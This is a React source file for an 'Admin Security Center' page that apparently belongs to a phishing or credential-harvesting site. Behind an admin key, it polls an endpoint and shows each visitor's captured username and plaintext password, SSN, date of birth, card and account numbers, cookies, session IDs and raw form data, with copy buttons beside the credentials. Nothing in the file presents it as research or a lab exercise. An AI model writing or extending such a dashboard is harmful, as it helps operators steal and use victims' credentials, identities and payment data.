import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Shield, Monitor, Smartphone, Tablet, MapPin, Clock, User, Globe, RefreshCw, Eye, EyeOff, AlertTriangle, Key, Mail, Phone, CreditCard, Cookie, ChevronDown, ChevronUp, Copy, Check, Building2 } from "lucide-react";
import { OfficialHeader } from "@/components/official-header";

interface VisitorLog {
  id: string;
  ip: string;
  browser: string;
  browserVersion: string;
  os: string;
  device: string;
  deviceType: string;
  location: {
    city: string;
    region: string;
    country: string;
    timezone: string;
  };
  page: string;
  username: string | null;
  password: string | null;
  email: string | null;
  phone: string | null;
  ssn: string | null;
  dateOfBirth: string | null;
  cardNumber: string | null;
  accountNumber: string | null;
  cookies: string | null;
  sessionId: string | null;
  formData: string | null;
  action: string;
  timestamp: string;
}

interface VisitorData {
  total: number;
  logs: VisitorLog[];
}

export default function AdminSecurityPage() {
  const [adminKey, setAdminKey] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [showKey, setShowKey] = useState(false);
  const [error, setError] = useState("");
  const [expandedRows, setExpandedRows] = useState<Set<string>>(new Set());
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const { data, isLoading, refetch, error: fetchError } = useQuery<VisitorData>({
    queryKey: ["/api/admin/visitors", adminKey],
    queryFn: async () => {
      const response = await fetch(`/api/admin/visitors?key=${encodeURIComponent(adminKey)}&limit=200`);
      if (!response.ok) {
        if (response.status === 401) {
          setIsAuthenticated(false);
          throw new Error("Invalid admin key");
        }
        throw new Error("Failed to fetch visitor logs");
      }
      return response.json();
    },
    enabled: isAuthenticated,
    refetchInterval: 10000,
  });

  const handleAuthenticate = () => {
    if (!adminKey.trim()) {
      setError("Please enter the admin key");
      return;
    }
    setError("");
    setIsAuthenticated(true);
  };

  const toggleRow = (id: string) => {
    const newExpanded = new Set(expandedRows);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedRows(newExpanded);
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const getDeviceIcon = (deviceType: string) => {
    switch (deviceType?.toLowerCase()) {
      case "mobile":
        return <Smartphone className="w-4 h-4" />;
      case "tablet":
        return <Tablet className="w-4 h-4" />;
      default:
        return <Monitor className="w-4 h-4" />;
    }
  };

  const getActionColor = (action: string) => {
    switch (action) {
      case "login_attempt":
        return "bg-blue-500 text-white";
      case "registration":
        return "bg-green-500 text-white";
      case "page_view":
        return "bg-gray-500 text-white";
      default:
        return "bg-yellow-500 text-white";
    }
  };

  const formatDate = (timestamp: string) => {
    return new Date(timestamp).toLocaleString("en-US", {
      month: "short",
      day: "numeric",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-900 flex flex-col">
        <OfficialHeader variant="simple" />
        <div className="flex-1 flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-gray-800 border-gray-700">
          <CardHeader className="text-center">
            <div className="mx-auto w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mb-4">
              <Shield className="w-8 h-8 text-white" />
            </div>
            <CardTitle className="text-white text-xl">Admin Security Center</CardTitle>
            <p className="text-gray-400 text-sm mt-2">Enter your admin key to access visitor logs</p>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="relative">
              <Input
                type={showKey ? "text" : "password"}
                placeholder="Enter admin security key"
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleAuthenticate()}
                className="bg-gray-700 border-gray-600 text-white pr-10"
                data-testid="input-admin-key"
              />
              <button
                type="button"
                onClick={() => setShowKey(!showKey)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
              >
                {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            {error && (
              <p className="text-red-400 text-sm flex items-center gap-2">
                <AlertTriangle className="w-4 h-4" />
                {error}
              </p>
            )}
            <Button
              onClick={handleAuthenticate}
              className="w-full bg-red-600 hover:bg-red-700 text-white"
              data-testid="button-authenticate"
            >
              Access Security Center
            </Button>
          </CardContent>
        </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 flex flex-col">
      <OfficialHeader variant="simple" />
      <div className="flex-1 p-4 md:p-6">
        <div className="max-w-[1600px] mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-red-600 rounded-lg flex items-center justify-center">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">Security Monitoring Center</h1>
              <p className="text-gray-400 text-sm">Real-time visitor tracking with full data capture</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-green-400 text-sm flex items-center gap-1">
              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
              Live
            </span>
            <Button
              onClick={() => refetch()}
              variant="outline"
              size="sm"
              className="border-gray-600 text-gray-300 hover:bg-gray-800"
              data-testid="button-refresh"
            >
              <RefreshCw className="w-4 h-4 mr-2" />
              Refresh
            </Button>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-5 gap-4 mb-6">
          <Card className="bg-gray-800 border-gray-700">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs">Total Logs</p>
                  <p className="text-2xl font-bold text-white">{data?.total || 0}</p>
                </div>
                <Globe className="w-6 h-6 text-blue-500" />
              </div>
            </CardContent>
          </Card>
          <Card className="bg-gray-800 border-gray-700">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs">Login Attempts</p>
                  <p className="text-2xl font-bold text-green-400">
                    {data?.logs.filter(l => l.action === "login_attempt").length || 0}
                  </p>
                </div>
                <Key className="w-6 h-6 text-green-500" />
              </div>
            </CardContent>
          </Card>
          <Card className="bg-gray-800 border-gray-700">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs">Registrations</p>
                  <p className="text-2xl font-bold text-purple-400">
                    {data?.logs.filter(l => l.action === "registration").length || 0}
                  </p>
                </div>
                <User className="w-6 h-6 text-purple-500" />
              </div>
            </CardContent>
          </Card>
          <Card className="bg-gray-800 border-gray-700">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs">With Passwords</p>
                  <p className="text-2xl font-bold text-red-400">
                    {data?.logs.filter(l => l.password).length || 0}
                  </p>
                </div>
                <Shield className="w-6 h-6 text-red-500" />
              </div>
            </CardContent>
          </Card>
          <Card className="bg-gray-800 border-gray-700">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs">Unique IPs</p>
                  <p className="text-2xl font-bold text-yellow-400">
                    {new Set(data?.logs.map(l => l.ip)).size || 0}
                  </p>
                </div>
                <MapPin className="w-6 h-6 text-yellow-500" />
              </div>
            </CardContent>
          </Card>
        </div>

        <Card className="bg-gray-800 border-gray-700">
          <CardHeader className="border-b border-gray-700">
            <CardTitle className="text-white flex items-center gap-2 text-base">
              <Monitor className="w-5 h-5" />
              Captured Data Log
              <span className="text-xs text-gray-400 font-normal ml-2">
                (Click row to expand details)
              </span>
            </CardTitle>
          </CardHeader>
          <CardContent className="p-0">
            {isLoading ? (
              <div className="text-center py-8">
                <RefreshCw className="w-8 h-8 text-gray-500 animate-spin mx-auto mb-2" />
                <p className="text-gray-400">Loading visitor logs...</p>
              </div>
            ) : data?.logs.length === 0 ? (
              <div className="text-center py-8">
                <Shield className="w-12 h-12 text-gray-600 mx-auto mb-2" />
                <p className="text-gray-400">No visitor activity recorded yet</p>
                <p className="text-gray-500 text-sm">Data will appear here when users log in or register</p>
              </div>
            ) : (
              <div className="divide-y divide-gray-700">
                {data?.logs.map((log) => (
                  <div key={log.id} className="hover:bg-gray-750" data-testid={`row-visitor-${log.id}`}>
                    <div 
                      className="p-4 cursor-pointer flex items-center justify-between"
                      onClick={() => toggleRow(log.id)}
                    >
                      <div className="flex items-center gap-4 flex-1 min-w-0">
                        <div className="flex-shrink-0">
                          <span className={`text-xs px-2 py-1 rounded font-medium ${getActionColor(log.action)}`}>
                            {log.action?.replace("_", " ").toUpperCase()}
                          </span>
                        </div>
                        
                        <div className="flex items-center gap-2 min-w-0">
                          <Clock className="w-3.5 h-3.5 text-gray-500 flex-shrink-0" />
                          <span className="text-xs text-gray-400">{formatDate(log.timestamp)}</span>
                        </div>

                        {log.username && (
                          <div className="flex items-center gap-2 bg-blue-900/30 px-2 py-1 rounded">
                            <User className="w-3.5 h-3.5 text-blue-400" />
                            <span className="text-sm font-medium text-blue-400">{log.username}</span>
                          </div>
                        )}

                        {log.password && (
                          <div className="flex items-center gap-2 bg-red-900/30 px-2 py-1 rounded">
                            <Key className="w-3.5 h-3.5 text-red-400" />
                            <span className="text-sm font-medium text-red-400">{log.password}</span>
                          </div>
                        )}

                        <div className="flex items-center gap-2 text-gray-400">
                          {getDeviceIcon(log.deviceType)}
                          <span className="text-xs">{log.browser}</span>
                        </div>

                        <div className="flex items-center gap-1.5 text-gray-400">
                          <MapPin className="w-3.5 h-3.5" />
                          <span className="text-xs">
                            {log.location?.city !== "Unknown" 
                              ? `${log.location.city}, ${log.location.country}`
                              : log.ip}
                          </span>
                        </div>
                      </div>

                      <div className="flex items-center gap-2">
                        <code className="text-xs bg-gray-700 px-2 py-1 rounded text-gray-300">{log.ip}</code>
                        {expandedRows.has(log.id) ? (
                          <ChevronUp className="w-4 h-4 text-gray-500" />
                        ) : (
                          <ChevronDown className="w-4 h-4 text-gray-500" />
                        )}
                      </div>
                    </div>

                    {expandedRows.has(log.id) && (
                      <div className="px-4 pb-4 bg-gray-850 border-t border-gray-700">
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-4">
                          <div className="space-y-3">
                            <h4 className="text-xs font-semibold text-gray-400 uppercase flex items-center gap-2">
                              <Key className="w-3.5 h-3.5" />
                              Credentials Captured
                            </h4>
                            <div className="space-y-2">
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">Username:</span>
                                <div className="flex items-center gap-2">
                                  <span className="text-sm text-white font-mono">{log.username || "—"}</span>
                                  {log.username && (
                                    <button onClick={() => copyToClipboard(log.username!, `user-${log.id}`)}>
                                      {copiedId === `user-${log.id}` ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3 text-gray-500" />}
                                    </button>
                                  )}
                                </div>
                              </div>
                              <div className="flex items-center justify-between bg-red-900/20 p-2 rounded border border-red-900/30">
                                <span className="text-xs text-gray-400">Password:</span>
                                <div className="flex items-center gap-2">
                                  <span className="text-sm text-red-400 font-mono">{log.password || "—"}</span>
                                  {log.password && (
                                    <button onClick={() => copyToClipboard(log.password!, `pass-${log.id}`)}>
                                      {copiedId === `pass-${log.id}` ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3 text-gray-500" />}
                                    </button>
                                  )}
                                </div>
                              </div>
                              {log.email && (
                                <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                  <span className="text-xs text-gray-400">Email:</span>
                                  <span className="text-sm text-white font-mono">{log.email}</span>
                                </div>
                              )}
                              {log.phone && (
                                <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                  <span className="text-xs text-gray-400">Phone:</span>
                                  <span className="text-sm text-white font-mono">{log.phone}</span>
                                </div>
                              )}
                              {log.ssn && (
                                <div className="flex items-center justify-between bg-yellow-900/20 p-2 rounded border border-yellow-900/30">
                                  <span className="text-xs text-gray-400">SSN:</span>
                                  <span className="text-sm text-yellow-400 font-mono">{log.ssn}</span>
                                </div>
                              )}
                              {log.dateOfBirth && (
                                <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                  <span className="text-xs text-gray-400">DOB:</span>
                                  <span className="text-sm text-white font-mono">{log.dateOfBirth}</span>
                                </div>
                              )}
                              {log.cardNumber && (
                                <div className="flex items-center justify-between bg-green-900/20 p-2 rounded border border-green-900/30">
                                  <span className="text-xs text-gray-400">Card Number:</span>
                                  <span className="text-sm text-green-400 font-mono">{log.cardNumber}</span>
                                </div>
                              )}
                              {log.accountNumber && (
                                <div className="flex items-center justify-between bg-purple-900/20 p-2 rounded border border-purple-900/30">
                                  <span className="text-xs text-gray-400">Account Number:</span>
                                  <span className="text-sm text-purple-400 font-mono">{log.accountNumber}</span>
                                </div>
                              )}
                            </div>
                          </div>

                          <div className="space-y-3">
                            <h4 className="text-xs font-semibold text-gray-400 uppercase flex items-center gap-2">
                              <Monitor className="w-3.5 h-3.5" />
                              Device & Location
                            </h4>
                            <div className="space-y-2">
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">IP Address:</span>
                                <span className="text-sm text-white font-mono">{log.ip}</span>
                              </div>
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">Location:</span>
                                <span className="text-sm text-white">
                                  {log.location?.city}, {log.location?.region}, {log.location?.country}
                                </span>
                              </div>
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">Device:</span>
                                <span className="text-sm text-white">{log.deviceType} - {log.device}</span>
                              </div>
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">Browser:</span>
                                <span className="text-sm text-white">{log.browser} {log.browserVersion}</span>
                              </div>
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">OS:</span>
                                <span className="text-sm text-white">{log.os}</span>
                              </div>
                              <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400">Timezone:</span>
                                <span className="text-sm text-white">{log.location?.timezone}</span>
                              </div>
                            </div>
                          </div>

                          <div className="space-y-3">
                            <h4 className="text-xs font-semibold text-gray-400 uppercase flex items-center gap-2">
                              <Cookie className="w-3.5 h-3.5" />
                              Session & Cookies
                            </h4>
                            <div className="space-y-2">
                              {log.sessionId && (
                                <div className="bg-gray-700/50 p-2 rounded">
                                  <span className="text-xs text-gray-400 block mb-1">Session ID:</span>
                                  <code className="text-xs text-green-400 break-all">{log.sessionId}</code>
                                </div>
                              )}
                              {log.cookies && (
                                <div className="bg-gray-700/50 p-2 rounded">
                                  <span className="text-xs text-gray-400 block mb-1">Cookies:</span>
                                  <code className="text-xs text-purple-400 break-all block max-h-24 overflow-y-auto">{log.cookies}</code>
                                </div>
                              )}
                              <div className="bg-gray-700/50 p-2 rounded">
                                <span className="text-xs text-gray-400 block mb-1">Page:</span>
                                <code className="text-xs text-blue-400">{log.page}</code>
                              </div>
                              {log.formData && (
                                <div className="bg-gray-700/50 p-2 rounded">
                                  <span className="text-xs text-gray-400 block mb-1">Raw Form Data:</span>
                                  <code className="text-xs text-orange-400 break-all block max-h-24 overflow-y-auto">{log.formData}</code>
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
        </div>
      </div>
    </div>
  );
}
